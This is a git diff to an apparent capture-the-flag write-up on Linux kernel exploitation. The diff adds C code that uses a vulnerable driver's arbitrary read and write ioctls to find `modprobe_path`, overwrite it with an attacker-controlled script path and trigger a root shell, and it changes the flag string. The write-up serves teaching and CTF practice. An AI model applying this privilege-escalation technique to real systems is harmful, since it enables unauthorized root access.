@@ -367,7 +367,41 @@ ffffffff82852420 D modprobe_path
 #define MODPROBE_PATH_OFFSET (0xffffffff82852420 - BASE_ADDRESS)
 ```
 
-Since we can perform Arbitrary Address Read, we can start with an egghunt to locate where the address of the string "/sbin/mo" (8 bytes) is stored. If found, we can then proceed to use Arbitrary Address Write to overwrite `modprobe_path` with "/home/blud/x".
+Since we can perform Arbitrary Address Read, we can start with an egghunt to locate where the address of the string "/sbin/mo" (8 bytes) is stored. 
+
+```c
+    struct Payload ww;
+    int offset = 0;
+    long leaked_value = 0;
+
+    for (offset=0; offset <= 512; offset++)
+    {
+        ww.where = &leaked_value;
+        ww.value = BASE_ADDRESS + MODPROBE_PATH_OFFSET + (offset << 20);
+        ioctl(fd, 0x6969, &ww);
+        leaked_value = ww.where;
+        printf("%d = 0x%llx\n", offset, leaked_value);
+        if (leaked_value == 0x6f6d2f6e6962732f){ // "/sbin/mo"
+            printf("[+] OFFSET FOUND %d\n", offset);
+            break;
+        } 
+    }
+```
+
+
+If found, we can then proceed to use Arbitrary Address Write to overwrite `modprobe_path` with "/home/blud/x", then trigger the shell.
+
+```c
+    puts("[+] Overwrite modprobe_path with evil_str");
+    ww.where = BASE_ADDRESS + MODPROBE_PATH_OFFSET + (offset << 20);
+    ww.value = (long)(&evil_str)+0;
+    ioctl(fd, 0xFADE, &ww);
+
+    ww.where = BASE_ADDRESS + MODPROBE_PATH_OFFSET + (offset << 20)+8;
+    ww.value = (long)(&evil_str)+8;
+    ioctl(fd, 0xFADE, &ww);
+    get_shell();
+```
 
 Here's my exploit to solve this challenge.
 
@@ -456,9 +490,9 @@ int main(int argc, char * argv[]){
 ``` 
 </details>
 
-Let's try the exploit in our local kernel (don't forget to re-enabled the kaslr and set the shell permission back to user).
+Let's try the exploit in our local environment (don't forget to re-enabled the kaslr and set the shell permission back to user).
 
-![PWN3D](images/7603442d4c5302eeae8e1ce5cf9533aa896cffcbc5ec7be70a18043339a97099.png)  
+![PWN3D](images/PWN3D.gif)  
 
     
-**Flag:** TCP1P{ju5T_4n0tH3r_p1vOt_ch4LlEn9e}
+**Flag:** TCP1P{WHY_DID_YALL_LET_HIM_COOK_!!!!😭😭😭}
